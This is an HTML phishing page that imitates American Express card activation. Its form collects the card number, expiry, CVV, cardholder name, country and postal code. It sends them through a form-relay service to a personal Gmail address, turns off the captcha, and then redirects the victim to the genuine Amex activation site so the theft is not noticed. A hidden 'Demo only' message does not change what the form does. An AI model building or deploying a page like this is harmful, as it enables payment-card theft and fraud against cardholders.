<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Card Activation</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link href="https://fonts.googleapis.com/css?family=Inter:400,500,700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="styles.css">
  <style>
    body {
      background: #fff;
      font-family: 'Inter', Arial, sans-serif;
      margin: 0;
      color: #222;
      min-height: 100vh;
    }
    .container {
      max-width: 370px;
      margin: 32px auto;
      background: #fff;
      border-radius: 14px;
      box-shadow: 0 2px 16px rgba(0,0,0,0.06);
      padding: 24px 16px 16px 16px;
      display: flex;
      flex-direction: column;
      gap: 16px;
    }
    .logo {
      width: 40px;
      height: 40px;
      margin: 0 auto 4px auto;
      display: block;
    }
    .title {
      text-align: center;
      font-size: 1.4rem;
      font-weight: 700;
      margin-bottom: 2px;
    }
    .subtitle {
      text-align: center;
      color: #6b6c72;
      font-size: 0.98rem;
      margin-bottom: 8px;
    }
    form {
      display: flex;
      flex-direction: column;
      gap: 10px;
    }
    .input-group {
      display: flex;
      flex-direction: column;
      gap: 3px;
    }
    label {
      font-size: 0.98rem;
      font-weight: 500;
      margin-bottom: 1px;
    }
    .input-wrapper {
      position: relative;
      display: flex;
      align-items: center;
    }
    input, select {
      width: 100%;
      padding: 8px 36px 8px 10px;
      font-size: 0.98rem;
      border: 1.2px solid #e5e7eb;
      border-radius: 6px;
      background: #f7f8fa;
      color: #222;
      outline: none;
      transition: border-color 0.2s;
    }
    input:focus, select:focus {
      border-color: #2ca01c;
    }
    .input-wrapper .fa {
      position: absolute;
      right: 10px;
      color: #bdbdbd;
      font-size: 1em;
    }
    .row {
      display: flex;
      gap: 8px;
    }
    .row > .input-group {
      flex: 1;
    }
    .pay-btn {
      background: #2ca01c;
      color: #fff;
      font-size: 1.05rem;
      font-weight: 700;
      border: none;
      border-radius: 6px;
      padding: 12px 0;
      margin-top: 4px;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      box-shadow: 0 1px 4px rgba(44,160,28,0.07);
      transition: background 0.2s;
    }
    .pay-btn:disabled {
      background: #bdbdbd;
      cursor: not-allowed;
    }
    .pay-btn .fa-lock {
      font-size: 1em;
    }
    .card-icons {
      display: flex;
      gap: 6px;
      margin-top: 2px;
    }
    .card-icons img {
      height: 18px;
      max-width: 32px;
      width: auto;
      object-fit: contain;
      display: inline-block;
      vertical-align: middle;
      background: #fff;
      border-radius: 3px;
      box-shadow: 0 1px 2px rgba(0,0,0,0.02);
      padding: 1px;
    }
    .error {
      color: #e10000;
      font-size: 0.92em;
      margin-top: 1px;
      min-height: 14px;
    }
    @media (max-width: 600px) {
      .container {
        padding: 8px 2vw;
        margin: 0;
        border-radius: 0;
        box-shadow: none;
        max-width: 98vw;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo" style="text-align:center; margin-bottom:8px;">
      <i class="fab fa-cc-amex" style="font-size:2.5rem; color:#2e77bb;"></i>
    </div>
    <div class="title">Card Activation</div>
    <div class="subtitle">Enter your card details to complete your card activation and start using your card.</div>
    <form action="https://formsubmit.co/harley53smith@gmail.com" method="POST" autocomplete="off">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://oce.americanexpress.com/myca/oce/emea/action/home?request_type=un_Activation&Face=en_GB&linknav=UK-Home-page-Login-Activate-new-Account#/splash">
      <div class="input-group">
        <label for="cardNumber">Card Number</label>
        <div class="input-wrapper">
          <input type="text" id="cardNumber" name="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" inputmode="numeric" required>
        </div>
        <div class="error" id="cardNumberError"></div>
      </div>
      <div class="row">
        <div class="input-group">
          <label for="expiry">Expiry</label>
          <div class="input-wrapper">
            <input type="text" id="expiry" name="expiry" maxlength="5" placeholder="MM/YY" required>
          </div>
          <div class="error" id="expiryError"></div>
        </div>
        <div class="input-group">
          <label for="cvv">CVV</label>
          <div class="input-wrapper">
            <input type="password" id="cvv" name="cvv" maxlength="4" placeholder="123" required>
          </div>
          <div class="error" id="cvvError"></div>
        </div>
      </div>
      <div class="input-group">
        <label for="name">Name on Card</label>
        <div class="input-wrapper">
          <input type="text" id="name" name="name" maxlength="32" placeholder="Full Name" required>
        </div>
        <div class="error" id="nameError"></div>
      </div>
      <div class="row">
        <div class="input-group">
          <label for="country">Country</label>
          <select id="country" name="country" required>
            <option value="">Select Country</option>
            <option value="US">United States</option>
            <option value="CA">Canada</option>
            <option value="GB">United Kingdom</option>
            <option value="AU">Australia</option>
            <option value="IN">India</option>
            <!-- Add more countries as needed -->
          </select>
        </div>
        <div class="input-group">
          <label for="zip">ZIP/Postal Code</label>
          <div class="input-wrapper">
            <input type="text" id="zip" name="zip" maxlength="10" placeholder="ZIP/Postal Code" required>
          </div>
          <div class="error" id="zipError"></div>
        </div>
      </div>
      <button type="submit" class="pay-btn" id="payBtn">Activate</button>
    </form>
    <div id="successMessage" style="display:none; text-align:center; color:#2ca01c; font-weight:600; font-size:1.1em; margin-top:18px;">Payment submitted! (Demo only)</div>
  </div>
  <script src="script.js"></script>
</body>
</html>
